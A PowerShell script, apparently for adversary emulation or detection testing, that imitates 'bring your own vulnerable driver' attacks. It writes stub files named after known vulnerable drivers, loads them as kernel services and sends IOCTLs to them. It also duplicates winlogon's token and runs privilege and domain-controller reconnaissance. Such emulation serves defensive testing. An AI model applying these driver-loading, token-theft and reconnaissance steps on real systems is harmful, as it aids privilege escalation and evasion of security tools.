$drivers = @(
    @{name="RTCore64";   device="\\.\RTCore64";   service="RTCore64Svc";   file="RTCore64.sys"},
    @{name="DBUtil";     device="\\.\DBUtil_2_3";  service="DBUtilDrv2";    file="DBUtil_2_3.sys"},
    @{name="gdrv";       device="\\.\GIO";         service="gaborern";      file="gdrv.sys"},
    @{name="AsrDrv106";  device="\\.\AsrDrv106";   service="AsrAutoChkUpdDrv"; file="AsrDrv106.sys"},
    @{name="ProcExp";    device="\\.\PROCEXP152";  service="PROCEXP152";    file="PROCEXP152.sys"}
)

if (-not ('BYOVD' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Runtime.InteropServices;
    public class BYOVD {
        [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
        public static extern IntPtr CreateFile(string f, int a, int s, IntPtr sa, int d, int fl, IntPtr t);
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool DeviceIoControl(IntPtr h, int c, byte[] i, int ib, byte[] o, int ob, ref int ret, IntPtr ov);
        [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
        [DllImport("ntdll.dll")] public static extern int NtLoadDriver(ref UNICODE_STRING name);
        [DllImport("ntdll.dll")] public static extern int NtUnloadDriver(ref UNICODE_STRING name);
        [DllImport("ntdll.dll")] public static extern int RtlAdjustPrivilege(int priv, bool enable, bool thread, ref bool prev);
        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING { public ushort Length; public ushort MaxLength; public IntPtr Buffer; }
    }
'@
}

$prev = $false
[BYOVD]::RtlAdjustPrivilege(10, $true, $false, [ref]$prev) | Out-Null

foreach ($drv in $drivers) {
    $path = "$env:TEMP\$($drv.file)"
    $pe = [byte[]]@(0x4D, 0x5A, 0x90, 0x00, 0x03) + (New-Object byte[] 507)
    [System.IO.File]::WriteAllBytes($path, $pe)

    & sc.exe create $drv.service binPath= $path type= kernel start= demand 2>&1 | Out-Null
    & sc.exe start $drv.service 2>&1 | Out-Null

    $regBase = "HKCU:\System\CurrentControlSet\Services\$($drv.service)"
    New-Item -Path $regBase -Force -ErrorAction SilentlyContinue | Out-Null
    New-ItemProperty -Path $regBase -Name "ImagePath" -Value "\??\$path" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
    New-ItemProperty -Path $regBase -Name "Type" -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null

    $handle = [BYOVD]::CreateFile($drv.device, 0x40000000, 0, [IntPtr]::Zero, 3, 0, [IntPtr]::Zero)
    if ($handle -ne [IntPtr]::new(-1) -and $handle -ne [IntPtr]::Zero) {
        $ret = 0
        $inBuf = [byte[]]@(0x00) * 40
        [BYOVD]::DeviceIoControl($handle, 0x7FFF2048, $inBuf, $inBuf.Length, $null, 0, [ref]$ret, [IntPtr]::Zero) | Out-Null
        [BYOVD]::DeviceIoControl($handle, 0x222004, $inBuf, $inBuf.Length, $null, 0, [ref]$ret, [IntPtr]::Zero) | Out-Null
        [BYOVD]::DeviceIoControl($handle, 0x9C402084, $inBuf, $inBuf.Length, $null, 0, [ref]$ret, [IntPtr]::Zero) | Out-Null
        [BYOVD]::CloseHandle($handle) | Out-Null
    }

    & sc.exe delete $drv.service 2>$null | Out-Null
    Remove-Item $path -Force -ErrorAction SilentlyContinue
    Remove-Item $regBase -Recurse -Force -ErrorAction SilentlyContinue
}

$ntdllPath = "$env:TEMP\ntdll_copy.dll"
try { Copy-Item "$env:SYSTEMROOT\System32\ntdll.dll" $ntdllPath -Force -ErrorAction Stop } catch {}
Remove-Item $ntdllPath -Force -ErrorAction SilentlyContinue

if (-not ('TokenPriv' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Runtime.InteropServices;
    using System.Diagnostics;
    public class TokenPriv {
        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int a, bool b, int p);
        [DllImport("advapi32.dll", SetLastError=true)] public static extern bool OpenProcessToken(IntPtr h, int a, ref IntPtr t);
        [DllImport("advapi32.dll", SetLastError=true)] public static extern bool DuplicateTokenEx(IntPtr t, int a, IntPtr sa, int il, int tt, ref IntPtr nt);
        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)] public static extern bool CreateProcessWithToken(IntPtr t, int f, string app, string cmd, int cf, IntPtr env, string dir, byte[] si, out byte[] pi);
        [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
    }
'@
}

$winlogon = Get-Process winlogon -ErrorAction SilentlyContinue | Select-Object -First 1
if ($winlogon) {
    $ph = [TokenPriv]::OpenProcess(0x0400, $false, $winlogon.Id)
    if ($ph -ne [IntPtr]::Zero) {
        $th = [IntPtr]::Zero
        [TokenPriv]::OpenProcessToken($ph, 0x0002, [ref]$th) | Out-Null
        if ($th -ne [IntPtr]::Zero) {
            $dup = [IntPtr]::Zero
            [TokenPriv]::DuplicateTokenEx($th, 0x02000000, [IntPtr]::Zero, 2, 1, [ref]$dup) | Out-Null
            if ($dup -ne [IntPtr]::Zero) { [TokenPriv]::CloseHandle($dup) | Out-Null }
            [TokenPriv]::CloseHandle($th) | Out-Null
        }
        [TokenPriv]::CloseHandle($ph) | Out-Null
    }
}

& whoami.exe /priv 2>&1 | Out-Null
& nltest.exe /dclist: 2>&1 | Out-Null
